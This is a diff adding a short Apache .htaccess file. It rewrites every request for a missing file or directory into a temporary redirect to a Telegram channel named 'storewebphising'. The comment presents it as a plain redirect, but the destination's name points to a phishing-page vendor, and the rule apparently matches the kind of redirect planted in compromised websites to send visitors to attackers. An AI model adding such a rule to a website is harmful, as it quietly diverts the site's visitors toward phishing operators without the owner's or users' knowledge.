@@ -1,0 +1,6 @@
+RewriteEngine On
+
+# Redirect to a specific URL if the requested file does not exist
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ https://t.me/storewebphising [R=302,L]
